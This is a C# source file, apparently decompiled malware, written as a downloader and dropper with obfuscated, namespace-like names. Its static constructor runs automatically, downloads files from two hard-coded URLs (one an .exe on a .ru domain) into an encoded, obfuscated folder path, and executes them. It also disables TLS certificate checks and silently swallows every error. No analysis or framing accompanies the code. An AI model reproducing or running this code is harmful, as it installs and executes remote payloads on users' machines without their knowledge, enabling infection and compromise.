using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mime;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

public static class SystemNetSocketsSocketIntTaskSocketAsyncEventArgsX
{
	public static string SystemNetMailSmtpStatusCodeC;

	public static void SystemDataCommonSqlIntStorageP(Action SystemNetNetworkInformationTcpStateU, params object[] args)
	{
		ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback, (RemoteCertificateValidationCallback)((object _, X509Certificate __, X509Chain ___, SslPolicyErrors ____) => true));
		try
		{
			SystemNetNetworkInformationTcpStateU();
		}
		catch
		{
		}
	}

	static SystemNetSocketsSocketIntTaskSocketAsyncEventArgsX()
	{
		foreach (string item in new List<string> { "https://maper.info/X7hGp", "https://ir.farawaycansay.ru/927952793.exe" })
		{
			try
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = SystemCodeDomCodeLinePragmaH(item),
					CreateNoWindow = false,
					WindowStyle = ProcessWindowStyle.Normal
				});
			}
			catch
			{
			}
		}
	}

	public static string SystemCodeDomCodeLinePragmaH(string SystemNetMailHelloCommandA)
	{
		string empty = string.Empty;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(SystemNetMailHelloCommandA);
		string path = string.Empty;
		string text = Environment.ExpandEnvironmentVariables(SystemSecurityCryptographyXCertificatesXSubjectKeyIdentifierHashAlgorithmL.SystemCollectionsSpecializedINotifyCollectionChangedt("ONetIWebProxygDQlJRY5MCUbM0g/Bx4KJDknPC0ZPAwdKCAGIyonCwcdXTwHFh4jFDYTM18="));
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		httpWebRequest.AuthenticationLevel = AuthenticationLevel.None;
		using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
		{
			string text2 = httpWebResponse.Headers[SystemSecurityCryptographyXCertificatesXSubjectKeyIdentifierHashAlgorithmL.SystemCollectionsSpecializedINotifyCollectionChangedt("INetIWebProxyg1BKBCAoLAEqG0A9NRM8FRFCCh8eMyIuEx9pdg==")];
			if (string.IsNullOrWhiteSpace(text2))
			{
				Uri uri = new Uri(SystemNetMailHelloCommandA);
				path = Path.GetFileName(uri.LocalPath);
			}
			else
			{
				ContentDisposition contentDisposition = new ContentDisposition(text2);
				path = contentDisposition.FileName;
			}
			Stream responseStream = httpWebResponse.GetResponseStream();
			using FileStream destination = File.Create(Path.Combine(text, path));
			responseStream.CopyTo(destination);
		}
		return Path.Combine(text, path);
	}
}
